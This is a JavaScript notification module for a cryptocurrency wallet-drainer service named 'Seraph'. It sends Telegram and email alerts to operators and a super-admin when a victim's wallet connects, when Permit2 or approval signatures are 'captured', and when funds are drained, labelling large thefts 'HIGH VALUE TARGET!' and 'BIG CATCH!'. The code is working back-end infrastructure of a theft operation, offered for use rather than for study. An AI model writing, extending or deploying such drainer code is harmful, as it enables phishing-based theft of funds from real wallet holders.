/**
 * ============================================================================
 * SERAPH SERVER - Notification Service (v7 - Wallet Connection Alerts)
 * ============================================================================
 * 
 * CHANGES from v6:
 * - Added notifyWalletConnection() for first-time wallet connections
 * - Added buildWalletConnectionTelegram() template
 * - Telegram ONLY (no email) for wallet connections
 * - Only triggers on first-time connections (isNew = true)
 * 
 * ============================================================================
 */

import supabase from '../config/supabase.js'
import { safeDecrypt } from '../utils/encryption.js'

// ============================================================================
// CONFIGURATION
// ============================================================================

const HIGH_VALUE_THRESHOLD = 10000 // USD - triggers priority alert
const TELEGRAM_API = 'https://api.telegram.org/bot'
const RESEND_API = 'https://api.resend.com/emails'

// Cache for platform settings (avoids DB hits on every notification)
let settingsCache = null
let settingsCacheTime = 0
const CACHE_TTL = 5 * 60 * 1000 // 5 minutes

// ============================================================================
// SETTINGS RETRIEVAL
// ============================================================================

/**
 * Get platform settings with caching
 * Returns: { telegram_bot_token, telegram_chat_id, resend_api_key }
 */
async function getPlatformSettings() {
  const now = Date.now()
  
  // Return cached if still valid
  if (settingsCache && (now - settingsCacheTime) < CACHE_TTL) {
    return settingsCache
  }
  
  try {
    const { data: settings, error } = await supabase
      .from('platform_settings')
      .select('key, value, is_encrypted')
    
    if (error) throw error
    
    const result = {}
    for (const setting of (settings || [])) {
      if (setting.is_encrypted && setting.value) {
        try {
          result[setting.key] = safeDecrypt(setting.value)
        } catch {
          result[setting.key] = null
        }
      } else {
        result[setting.key] = setting.value
      }
    }
    
    settingsCache = result
    settingsCacheTime = now
    
    return result
  } catch (err) {
    console.error('[Notification] Failed to fetch platform settings:', err.message)
    return settingsCache || {}
  }
}

/**
 * Get operator notification settings
 */
async function getOperatorSettings(operatorId) {
  if (!operatorId) return null
  
  try {
    const { data, error } = await supabase
      .from('operators')
      .select(`
        id, username, email,
        telegram_chat_id, notification_email,
        telegram_notifications, email_notifications
      `)
      .eq('id', operatorId)
      .single()
    
    if (error) throw error
    
    return data
  } catch (err) {
    console.error('[Notification] Failed to fetch operator settings:', err.message)
    return null
  }
}

/**
 * Get campaign info for notifications
 */
async function getCampaignInfo(campaignId) {
  if (!campaignId) return null
  
  try {
    const { data, error } = await supabase
      .from('campaigns')
      .select('id, name, operator_id')
      .eq('id', campaignId)
      .single()
    
    if (error) throw error
    return data
  } catch {
    return null
  }
}

// ============================================================================
// TELEGRAM NOTIFICATIONS
// ============================================================================

/**
 * Send Telegram message
 * Uses HTML parse mode for reliable formatting
 */
async function sendTelegram(botToken, chatId, message, options = {}) {
  if (!botToken || !chatId) {
    return false
  }
  
  try {
    const url = `${TELEGRAM_API}${botToken}/sendMessage`
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...options
      })
    })
    
    const result = await response.json()
    
    if (!result.ok) {
      console.error('[Notification] Telegram error:', result.description)
      return false
    }
    
    return true
  } catch (err) {
    console.error('[Notification] Telegram send failed:', err.message)
    return false
  }
}

/**
 * Send Telegram to SuperAdmin
 */
async function sendToSuperAdmin(message, options = {}) {
  const settings = await getPlatformSettings()
  
  if (!settings.telegram_bot_token || !settings.telegram_chat_id) {
    return false
  }
  
  return sendTelegram(settings.telegram_bot_token, settings.telegram_chat_id, message, options)
}

/**
 * Send Telegram to Operator
 */
async function sendToOperator(operatorId, message, options = {}) {
  const [settings, operator] = await Promise.all([
    getPlatformSettings(),
    getOperatorSettings(operatorId)
  ])
  
  if (!settings.telegram_bot_token) {
    return false
  }
  
  if (!operator?.telegram_notifications || !operator?.telegram_chat_id) {
    return false
  }
  
  return sendTelegram(settings.telegram_bot_token, operator.telegram_chat_id, message, options)
}

// ============================================================================
// EMAIL NOTIFICATIONS
// ============================================================================

/**
 * Send email via Resend API
 */
async function sendEmail(apiKey, { to, subject, html, text }) {
  if (!apiKey || !to) {
    return false
  }
  
  try {
    const response = await fetch(RESEND_API, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${apiKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from: 'Seraph Console <noreply@seraphcoresys.xyz>',
        to: [to],
        subject,
        html,
        text
      })
    })
    
    if (!response.ok) {
      const result = await response.json()
      console.error('[Notification] Resend error:', result.message || result)
      return false
    }
    
    return true
  } catch (err) {
    console.error('[Notification] Email send failed:', err.message)
    return false
  }
}

/**
 * Send email to Operator
 */
async function sendEmailToOperator(operatorId, { subject, html, text }) {
  const [settings, operator] = await Promise.all([
    getPlatformSettings(),
    getOperatorSettings(operatorId)
  ])
  
  if (!settings.resend_api_key) {
    return false
  }
  
  if (!operator?.email_notifications) {
    return false
  }
  
  const email = operator.notification_email || operator.email
  if (!email) {
    return false
  }
  
  // return sendEmail(settings.resend_api_key, { to: email, subject, html, text })
  return false
}

// ============================================================================
// FORMATTERS
// ============================================================================

function formatUSD(value) {
  const num = parseFloat(value) || 0
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',
    minimumFractionDigits: 2,
    maximumFractionDigits: 2
  }).format(num)
}

function formatAddress(address) {
  if (!address) return 'N/A'
  if (address.length <= 13) return address
  return `${address.slice(0, 6)}...${address.slice(-4)}`
}

function formatSignatureType(type) {
  const types = {
    'permit2_batch': 'Permit2 Batch',
    'permit2_single': 'Permit2 Single',
    'native_permit': 'Native Permit',
    'native_permit_batch': 'Native Permit Batch',
    'eth_drain': 'ETH Drain',
    'eth_claim': 'ETH Claim',
    // Approval types
    'approval': 'Token Approval',
    'approve': 'Token Approval',
    'increaseAllowance': 'Allowance Increase',
    'approval_transferFrom': 'Approval Transfer',
    'transferFrom': 'Transfer From'
  }
  return types[type] || type || 'Unknown'
}

function escapeHtml(text) {
  if (!text) return ''
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
}

function getChainName(chainId) {
  const chains = {
    1: 'Ethereum',
    56: 'BSC',
    137: 'Polygon',
    42161: 'Arbitrum',
    10: 'Optimism',
    8453: 'Base',
    11155111: 'Sepolia'
  }
  return chains[chainId] || `Chain ${chainId}`
}

function formatDateTime(date) {
  return new Date(date).toLocaleString('en-US', {
    month: 'short',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    hour12: true
  })
}

// ============================================================================
// WALLET CONNECTION NOTIFICATION (NEW in v7)
// Telegram only - no email for wallet connections
// ============================================================================

/**
 * Build Telegram message for first-time wallet connection
 */
function buildWalletConnectionTelegram(data, isSuperAdmin = false) {
  let msg = `🔗 <b>NEW WALLET CONNECTED</b>\n\n`
  msg += `👤 <b>Address:</b> <code>${data.walletAddress}</code>\n`
  msg += `⛓ <b>Chain:</b> ${getChainName(data.chainId)}\n`
  
  if (data.domain) {
    msg += `🌐 <b>Domain:</b> ${escapeHtml(data.domain)}\n`
  }
  
  if (isSuperAdmin) {
    if (data.operatorUsername) {
      msg += `👷 <b>Operator:</b> ${escapeHtml(data.operatorUsername)}\n`
    }
  }
  
  if (data.campaignName) {
    msg += `📊 <b>Campaign:</b> ${escapeHtml(data.campaignName)}\n`
  }
  
  msg += `\n⏰ <i>${formatDateTime(new Date())}</i>`
  
  return msg
}

// ============================================================================
// SIGNATURE NOTIFICATION TEMPLATES
// ============================================================================

function buildSignatureCapturedTelegram(data, isSuperAdmin = false) {
  const isHighValue = (data.totalValueUsd || 0) >= HIGH_VALUE_THRESHOLD
  const emoji = isHighValue ? '🎯💎' : '🔥'
  
  let msg = `${emoji} <b>SIGNATURE CAPTURED</b>\n\n`
  msg += `👤 <b>Victim:</b> <code>${formatAddress(data.victimAddress)}</code>\n`
  msg += `📋 <b>Type:</b> ${formatSignatureType(data.signatureType)}\n`
  msg += `💵 <b>Value:</b> ${formatUSD(data.totalValueUsd)}\n`
  msg += `⛓ <b>Chain:</b> ${getChainName(data.chainId)}\n`
  
  if (data.tokens && data.tokens.length > 0) {
    msg += `🪙 <b>Tokens:</b> ${data.tokens.length}\n`
  }
  
  if (isSuperAdmin) {
    if (data.operatorUsername) {
      msg += `👷 <b>Operator:</b> ${escapeHtml(data.operatorUsername)}\n`
    }
    if (data.campaignName) {
      msg += `📊 <b>Campaign:</b> ${escapeHtml(data.campaignName)}\n`
    }
  }
  
  if (isHighValue) {
    msg += `\n🔥 <b>HIGH VALUE TARGET!</b>`
  }
  
  return msg
}

function buildSignatureCapturedEmail(data) {
  const isHighValue = (data.totalValueUsd || 0) >= HIGH_VALUE_THRESHOLD
  
  return {
    subject: `🔥 Signature Captured: ${formatSignatureType(data.signatureType)} - ${formatUSD(data.totalValueUsd)}`,
    html: `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #dc2626, #b91c1c); color: white; padding: 24px; border-radius: 12px 12px 0 0;">
          <h2 style="margin: 0; font-size: 24px;">🔥 Signature Captured</h2>
          <p style="margin: 8px 0 0 0; opacity: 0.9;">${formatSignatureType(data.signatureType)}</p>
        </div>
        <div style="background: #1a1a2e; color: #e5e5e5; padding: 24px; border-radius: 0 0 12px 12px;">
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 12px 0; color: #9ca3af; width: 140px;">Victim Address</td>
              <td style="padding: 12px 0; font-family: monospace; font-size: 14px;">${formatAddress(data.victimAddress)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Estimated Value</td>
              <td style="padding: 12px 0; color: #22c55e; font-weight: bold; font-size: 20px;">${formatUSD(data.totalValueUsd)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Tokens</td>
              <td style="padding: 12px 0;">${data.tokens?.length || 0} tokens</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Chain</td>
              <td style="padding: 12px 0;">${getChainName(data.chainId)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Campaign</td>
              <td style="padding: 12px 0;">${escapeHtml(data.campaignName) || 'Unknown'}</td>
            </tr>
          </table>
          ${isHighValue ? `
            <div style="background: linear-gradient(135deg, #f59e0b, #d97706); color: white; padding: 16px; border-radius: 8px; text-align: center; margin-top: 20px;">
              <strong>💎 HIGH VALUE TARGET!</strong>
            </div>
          ` : ''}
        </div>
      </div>
    `,
    text: `Signature Captured\n\nVictim: ${formatAddress(data.victimAddress)}\nType: ${formatSignatureType(data.signatureType)}\nValue: ${formatUSD(data.totalValueUsd)}\nTokens: ${data.tokens?.length || 0}`
  }
}

// ============================================================================
// DRAIN NOTIFICATION TEMPLATES
// ============================================================================

function buildDrainSuccessTelegram(data, isSuperAdmin = false) {
  const isHighValue = (data.totalValueUsd || 0) >= HIGH_VALUE_THRESHOLD
  const emoji = isHighValue ? '💰💎' : '✅'
  
  let msg = `${emoji} <b>DRAIN SUCCESSFUL</b>\n\n`
  msg += `👤 <b>Victim:</b> <code>${formatAddress(data.victimAddress)}</code>\n`
  msg += `📋 <b>Type:</b> ${formatSignatureType(data.attackType)}\n`
  msg += `💵 <b>Value:</b> ${formatUSD(data.totalValueUsd)}\n`
  
  if (data.txHash) {
    msg += `🔗 <b>TX:</b> <code>${formatAddress(data.txHash)}</code>\n`
  }
  
  if (isSuperAdmin) {
    if (data.operatorUsername) {
      msg += `👷 <b>Operator:</b> ${escapeHtml(data.operatorUsername)}\n`
    }
    if (data.campaignName) {
      msg += `📊 <b>Campaign:</b> ${escapeHtml(data.campaignName)}\n`
    }
  }
  
  if (isHighValue) {
    msg += `\n🎉 <b>BIG CATCH!</b>`
  }
  
  return msg
}

function buildDrainSuccessEmail(data) {
  const isHighValue = (data.totalValueUsd || 0) >= HIGH_VALUE_THRESHOLD
  
  return {
    subject: `✅ Drain Successful: ${formatUSD(data.totalValueUsd)}`,
    html: `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #22c55e, #16a34a); color: white; padding: 24px; border-radius: 12px 12px 0 0;">
          <h2 style="margin: 0; font-size: 24px;">✅ Drain Successful</h2>
          <p style="margin: 8px 0 0 0; opacity: 0.9;">${formatSignatureType(data.attackType)}</p>
        </div>
        <div style="background: #1a1a2e; color: #e5e5e5; padding: 24px; border-radius: 0 0 12px 12px;">
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 12px 0; color: #9ca3af; width: 140px;">Victim Address</td>
              <td style="padding: 12px 0; font-family: monospace; font-size: 14px;">${formatAddress(data.victimAddress)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Value Drained</td>
              <td style="padding: 12px 0; color: #22c55e; font-weight: bold; font-size: 20px;">${formatUSD(data.totalValueUsd)}</td>
            </tr>
            ${data.txHash ? `
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">TX Hash</td>
              <td style="padding: 12px 0; font-family: monospace; font-size: 12px;">${formatAddress(data.txHash)}</td>
            </tr>
            ` : ''}
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Campaign</td>
              <td style="padding: 12px 0;">${escapeHtml(data.campaignName) || 'Unknown'}</td>
            </tr>
          </table>
          ${isHighValue ? `
            <div style="background: linear-gradient(135deg, #f59e0b, #d97706); color: white; padding: 16px; border-radius: 8px; text-align: center; margin-top: 20px;">
              <strong>🎉 BIG CATCH!</strong>
            </div>
          ` : ''}
        </div>
      </div>
    `,
    text: `Drain Successful\n\nVictim: ${formatAddress(data.victimAddress)}\nValue: ${formatUSD(data.totalValueUsd)}\nTX: ${data.txHash || 'N/A'}`
  }
}

function buildDrainFailedTelegram(data) {
  let msg = `❌ <b>DRAIN FAILED</b>\n\n`
  msg += `👤 <b>Victim:</b> <code>${formatAddress(data.victimAddress)}</code>\n`
  msg += `📋 <b>Type:</b> ${formatSignatureType(data.attackType)}\n`
  msg += `💵 <b>Potential:</b> ${formatUSD(data.totalValueUsd)}\n`
  msg += `❌ <b>Error:</b> ${escapeHtml(data.errorMessage) || 'Unknown error'}\n`
  
  if (data.campaignName) {
    msg += `📊 <b>Campaign:</b> ${escapeHtml(data.campaignName)}\n`
  }
  
  return msg
}

// ============================================================================
// APPROVAL NOTIFICATION TEMPLATES
// ============================================================================

function buildApprovalCapturedTelegram(data, isSuperAdmin = false) {
  const isHighValue = (data.valueUsd || 0) >= HIGH_VALUE_THRESHOLD
  const emoji = isHighValue ? '🎯💎' : '📝'
  
  let msg = `${emoji} <b>TOKEN APPROVAL CAPTURED</b>\n\n`
  msg += `👤 <b>Victim:</b> <code>${formatAddress(data.victimAddress)}</code>\n`
  msg += `🪙 <b>Token:</b> ${escapeHtml(data.tokenSymbol)}\n`
  msg += `💵 <b>Value:</b> ${formatUSD(data.valueUsd)}\n`
  msg += `📋 <b>Method:</b> ${formatSignatureType(data.method)}\n`
  msg += `⛓ <b>Chain:</b> ${getChainName(data.chainId)}\n`
  
  if (isSuperAdmin) {
    if (data.operatorUsername) {
      msg += `👷 <b>Operator:</b> ${escapeHtml(data.operatorUsername)}\n`
    }
    if (data.campaignName) {
      msg += `📊 <b>Campaign:</b> ${escapeHtml(data.campaignName)}\n`
    }
  }
  
  msg += `\n⏳ <i>Pending execution via transferFrom()</i>`
  
  if (isHighValue) {
    msg += `\n\n🔥 <b>HIGH VALUE TARGET!</b>`
  }
  
  return msg
}

function buildApprovalCapturedEmail(data) {
  const isHighValue = (data.valueUsd || 0) >= HIGH_VALUE_THRESHOLD
  
  return {
    subject: `📝 Approval Captured: ${escapeHtml(data.tokenSymbol)} - ${formatUSD(data.valueUsd)}`,
    html: `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #7c3aed, #a855f7); color: white; padding: 24px; border-radius: 12px 12px 0 0;">
          <h2 style="margin: 0; font-size: 24px;">📝 Token Approval Captured</h2>
          <p style="margin: 8px 0 0 0; opacity: 0.9;">Awaiting execution</p>
        </div>
        <div style="background: #1a1a2e; color: #e5e5e5; padding: 24px; border-radius: 0 0 12px 12px;">
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 12px 0; color: #9ca3af; width: 140px;">Victim Address</td>
              <td style="padding: 12px 0; font-family: monospace; font-size: 14px;">${formatAddress(data.victimAddress)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Token</td>
              <td style="padding: 12px 0; font-weight: bold;">${escapeHtml(data.tokenSymbol)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Potential Value</td>
              <td style="padding: 12px 0; color: #a855f7; font-weight: bold; font-size: 20px;">${formatUSD(data.valueUsd)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Method</td>
              <td style="padding: 12px 0;">${formatSignatureType(data.method)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Chain</td>
              <td style="padding: 12px 0;">${getChainName(data.chainId)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Campaign</td>
              <td style="padding: 12px 0;">${escapeHtml(data.campaignName) || 'Unknown'}</td>
            </tr>
          </table>
          <div style="background: #2a2a4a; padding: 16px; border-radius: 8px; margin-top: 20px; text-align: center;">
            <p style="margin: 0; color: #fbbf24;">⏳ Go to Operator Panel to execute transferFrom()</p>
          </div>
          ${isHighValue ? `
            <div style="background: linear-gradient(135deg, #f59e0b, #d97706); color: white; padding: 16px; border-radius: 8px; text-align: center; margin-top: 12px;">
              <strong>💎 HIGH VALUE TARGET!</strong>
            </div>
          ` : ''}
        </div>
      </div>
    `,
    text: `Token Approval Captured\n\nVictim: ${formatAddress(data.victimAddress)}\nToken: ${data.tokenSymbol}\nValue: ${formatUSD(data.valueUsd)}\nMethod: ${data.method}\n\nGo to Operator Panel to execute.`
  }
}

function buildApprovalExecutedTelegram(data, isSuperAdmin = false) {
  const isHighValue = (data.valueUsd || 0) >= HIGH_VALUE_THRESHOLD
  const emoji = isHighValue ? '💰💎' : '✅'
  
  let msg = `${emoji} <b>APPROVAL EXECUTED</b>\n\n`
  msg += `👤 <b>Victim:</b> <code>${formatAddress(data.victimAddress)}</code>\n`
  msg += `🪙 <b>Token:</b> ${escapeHtml(data.tokenSymbol)}\n`
  msg += `💵 <b>Value:</b> ${formatUSD(data.valueUsd)}\n`
  
  if (data.txHash) {
    msg += `🔗 <b>TX:</b> <code>${formatAddress(data.txHash)}</code>\n`
  }
  
  if (isSuperAdmin) {
    if (data.operatorUsername) {
      msg += `👷 <b>Operator:</b> ${escapeHtml(data.operatorUsername)}\n`
    }
    if (data.campaignName) {
      msg += `📊 <b>Campaign:</b> ${escapeHtml(data.campaignName)}\n`
    }
  }
  
  msg += `\n✅ <i>Tokens transferred via transferFrom()</i>`
  
  if (isHighValue) {
    msg += `\n\n🎉 <b>BIG CATCH!</b>`
  }
  
  return msg
}

function buildApprovalExecutedEmail(data) {
  const isHighValue = (data.valueUsd || 0) >= HIGH_VALUE_THRESHOLD
  
  return {
    subject: `✅ Approval Executed: ${escapeHtml(data.tokenSymbol)} - ${formatUSD(data.valueUsd)}`,
    html: `
      <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto;">
        <div style="background: linear-gradient(135deg, #22c55e, #16a34a); color: white; padding: 24px; border-radius: 12px 12px 0 0;">
          <h2 style="margin: 0; font-size: 24px;">✅ Approval Executed</h2>
          <p style="margin: 8px 0 0 0; opacity: 0.9;">Tokens transferred successfully</p>
        </div>
        <div style="background: #1a1a2e; color: #e5e5e5; padding: 24px; border-radius: 0 0 12px 12px;">
          <table style="width: 100%; border-collapse: collapse;">
            <tr>
              <td style="padding: 12px 0; color: #9ca3af; width: 140px;">Victim Address</td>
              <td style="padding: 12px 0; font-family: monospace; font-size: 14px;">${formatAddress(data.victimAddress)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Token</td>
              <td style="padding: 12px 0; font-weight: bold;">${escapeHtml(data.tokenSymbol)}</td>
            </tr>
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Value Drained</td>
              <td style="padding: 12px 0; color: #22c55e; font-weight: bold; font-size: 20px;">${formatUSD(data.valueUsd)}</td>
            </tr>
            ${data.txHash ? `
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">TX Hash</td>
              <td style="padding: 12px 0; font-family: monospace; font-size: 12px;">${formatAddress(data.txHash)}</td>
            </tr>
            ` : ''}
            <tr>
              <td style="padding: 12px 0; color: #9ca3af;">Campaign</td>
              <td style="padding: 12px 0;">${escapeHtml(data.campaignName) || 'Unknown'}</td>
            </tr>
          </table>
          ${isHighValue ? `
            <div style="background: linear-gradient(135deg, #f59e0b, #d97706); color: white; padding: 16px; border-radius: 8px; text-align: center; margin-top: 20px;">
              <strong>🎉 BIG CATCH!</strong>
            </div>
          ` : ''}
        </div>
      </div>
    `,
    text: `Approval Executed\n\nVictim: ${formatAddress(data.victimAddress)}\nToken: ${data.tokenSymbol}\nValue: ${formatUSD(data.valueUsd)}\nTX: ${data.txHash || 'N/A'}`
  }
}

// ============================================================================
// PUBLIC NOTIFICATION METHODS
// ============================================================================

/**
 * Notify on first-time wallet connection (NEW in v7)
 * TELEGRAM ONLY - No email for wallet connections
 * 
 * @param {Object} data - Connection data
 * @param {string} data.walletAddress - Connected wallet address
 * @param {number} data.chainId - Chain ID
 * @param {string} data.domain - Domain where connection occurred
 * @param {string} data.campaignId - Campaign ID
 * @param {string} data.campaignName - Campaign name
 * @param {string} data.operatorId - Operator ID
 * @param {string} data.operatorUsername - Operator username
 */
export async function notifyWalletConnection(data) {
  const {
    walletAddress,
    chainId,
    domain,
    campaignId,
    operatorId
  } = data
  
  // Get campaign and operator info if not provided
  let campaignName = data.campaignName
  let operatorUsername = data.operatorUsername
  
  if (!campaignName || !operatorUsername) {
    const [campaign, operator] = await Promise.all([
      campaignName ? null : getCampaignInfo(campaignId),
      operatorUsername ? null : getOperatorSettings(operatorId)
    ])
    
    if (campaign && !campaignName) {
      campaignName = campaign.name
    }
    if (operator && !operatorUsername) {
      operatorUsername = operator.username
    }
  }
  
  const notifyData = {
    walletAddress: walletAddress?.toLowerCase(),
    chainId: chainId || 11155111,
    domain,
    campaignName,
    operatorUsername
  }
  
  // Send Telegram ONLY (no email for wallet connections)
  Promise.all([
    sendToOperator(operatorId, buildWalletConnectionTelegram(notifyData, false)),
    sendToSuperAdmin(buildWalletConnectionTelegram(notifyData, true))
  ]).catch(err => {
    console.error('[Notification] Wallet connection notification failed:', err.message)
  })
}

/**
 * Notify on signature capture
 */
export async function notifySignatureCapture(signature, campaign = null, operator = null) {
  const data = {
    victimAddress: signature.victim_address,
    signatureType: signature.signature_type,
    totalValueUsd: signature.total_value_usd || 0,
    chainId: signature.chain_id || 11155111,
    tokens: signature.tokens,
    campaignName: campaign?.name,
    operatorUsername: operator?.username
  }
  
  const operatorId = signature.operator_id
  
  Promise.all([
    sendToOperator(operatorId, buildSignatureCapturedTelegram(data, false)),
    sendEmailToOperator(operatorId, buildSignatureCapturedEmail(data)),
    sendToSuperAdmin(buildSignatureCapturedTelegram(data, true))
  ]).catch(err => {
    console.error('[Notification] Signature capture notification failed:', err.message)
  })
}

/**
 * Notify on drain success
 */
export async function notifyDrainSuccess(data) {
  const {
    operatorId,
    victimAddress,
    attackType,
    totalValueUsd,
    txHash,
    campaignName,
    operatorUsername
  } = data
  
  const notifyData = {
    victimAddress,
    attackType,
    totalValueUsd: totalValueUsd || 0,
    txHash,
    campaignName,
    operatorUsername
  }
  
  Promise.all([
    sendToOperator(operatorId, buildDrainSuccessTelegram(notifyData, false)),
    sendEmailToOperator(operatorId, buildDrainSuccessEmail(notifyData)),
    sendToSuperAdmin(buildDrainSuccessTelegram(notifyData, true))
  ]).catch(err => {
    console.error('[Notification] Drain success notification failed:', err.message)
  })
}

/**
 * Notify on drain failure
 */
export async function notifyDrainFailed(data) {
  const {
    operatorId,
    victimAddress,
    attackType,
    totalValueUsd,
    errorMessage,
    campaignName
  } = data
  
  const notifyData = {
    victimAddress,
    attackType,
    totalValueUsd: totalValueUsd || 0,
    errorMessage,
    campaignName
  }
  
  Promise.all([
    sendToOperator(operatorId, buildDrainFailedTelegram(notifyData))
  ]).catch(err => {
    console.error('[Notification] Drain failed notification failed:', err.message)
  })
}

/**
 * Notify on approval captured
 */
export async function notifyApprovalCaptured(data) {
  const {
    operatorId,
    victimAddress,
    tokenSymbol,
    valueUsd,
    method,
    chainId,
    campaignName,
    operatorUsername
  } = data
  
  const notifyData = {
    victimAddress,
    tokenSymbol,
    valueUsd: valueUsd || 0,
    method,
    chainId,
    campaignName,
    operatorUsername
  }
  
  Promise.all([
    sendToOperator(operatorId, buildApprovalCapturedTelegram(notifyData, false)),
    sendEmailToOperator(operatorId, buildApprovalCapturedEmail(notifyData)),
    sendToSuperAdmin(buildApprovalCapturedTelegram(notifyData, true))
  ]).catch(err => {
    console.error('[Notification] Approval capture notification failed:', err.message)
  })
}

/**
 * Notify on approval executed
 */
export async function notifyApprovalExecuted(data) {
  const {
    operatorId,
    victimAddress,
    tokenSymbol,
    valueUsd,
    txHash,
    campaignName,
    operatorUsername
  } = data
  
  const notifyData = {
    victimAddress,
    tokenSymbol,
    valueUsd: valueUsd || 0,
    txHash,
    campaignName,
    operatorUsername
  }
  
  Promise.all([
    sendToOperator(operatorId, buildApprovalExecutedTelegram(notifyData, false)),
    sendEmailToOperator(operatorId, buildApprovalExecutedEmail(notifyData)),
    sendToSuperAdmin(buildApprovalExecutedTelegram(notifyData, true))
  ]).catch(err => {
    console.error('[Notification] Approval executed notification failed:', err.message)
  })
}

/**
 * Notify on high value target (>$10k)
 */
export async function notifyHighValue(type, data) {
  const emoji = type === 'signature' ? '🎯💎' : '💰💎'
  
  let msg = `${emoji} <b>HIGH VALUE ALERT</b>\n\n`
  msg += `📌 <b>Type:</b> ${type === 'signature' ? 'Signature Captured' : type === 'approval' ? 'Approval Captured' : 'Drain Executed'}\n`
  msg += `👤 <b>Victim:</b> <code>${formatAddress(data.victimAddress)}</code>\n`
  msg += `💵 <b>Value:</b> ${formatUSD(data.totalValueUsd || data.valueUsd)}\n`
  
  if (data.operatorUsername) {
    msg += `👷 <b>Operator:</b> ${escapeHtml(data.operatorUsername)}\n`
  }
  
  if (data.campaignName) {
    msg += `📊 <b>Campaign:</b> ${escapeHtml(data.campaignName)}\n`
  }
  
  msg += `\n⚡ <b>Requires immediate attention!</b>`
  
  await sendToSuperAdmin(msg)
}

/**
 * Send test notification
 */
export async function sendTestNotification(type, target) {
  const settings = await getPlatformSettings()
  
  if (type === 'telegram') {
    if (!settings.telegram_bot_token) {
      throw new Error('Telegram bot token not configured')
    }
    
    const message = `✅ <b>Seraph Test Notification</b>\n\n` +
      `Your Telegram notifications are working!\n\n` +
      `<i>Sent at: ${new Date().toISOString()}</i>`
    
    const result = await sendTelegram(settings.telegram_bot_token, target, message)
    
    if (!result) {
      throw new Error('Failed to send Telegram message')
    }
    
    return { sent: true, channel: 'telegram' }
  }
  
  if (type === 'email') {
    if (!settings.resend_api_key) {
      throw new Error('Resend API key not configured')
    }
    
    const result = await sendEmail(settings.resend_api_key, {
      to: target,
      subject: '✅ Seraph Test Notification',
      html: `
        <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto;">
          <div style="background: #7c3aed; color: white; padding: 24px; border-radius: 12px;">
            <h2 style="margin: 0;">✅ Test Successful</h2>
            <p style="margin: 12px 0 0 0;">Your email notifications are working correctly!</p>
            <p style="margin: 12px 0 0 0; font-size: 12px; opacity: 0.8;">Sent at: ${new Date().toISOString()}</p>
          </div>
        </div>
      `,
      text: 'Seraph Test Notification - Your email notifications are working correctly!'
    })
    
    if (!result) {
      throw new Error('Failed to send email')
    }
    
    return { sent: true, channel: 'email' }
  }
  
  throw new Error('Invalid notification type')
}

/**
 * Clear settings cache
 */
export function clearSettingsCache() {
  settingsCache = null
  settingsCacheTime = 0
}

// ============================================================================
// UTILITY EXPORTS
// ============================================================================

export {
  getPlatformSettings,
  getOperatorSettings,
  getCampaignInfo,
  sendToSuperAdmin,
  sendToOperator,
  sendEmailToOperator,
  formatUSD,
  formatAddress,
  formatSignatureType
}

// ============================================================================
// DEFAULT EXPORT
// ============================================================================

export default {
  // Main notification methods
  notifyWalletConnection,   // NEW in v7
  notifySignatureCapture,
  notifyDrainSuccess,
  notifyDrainFailed,
  notifyApprovalCaptured,
  notifyApprovalExecuted,
  notifyHighValue,
  
  // Direct send methods
  sendToSuperAdmin,
  sendToOperator,
  sendEmailToOperator,
  
  // Utility
  sendTestNotification,
  clearSettingsCache,
  getPlatformSettings,
  getOperatorSettings,
  getCampaignInfo
}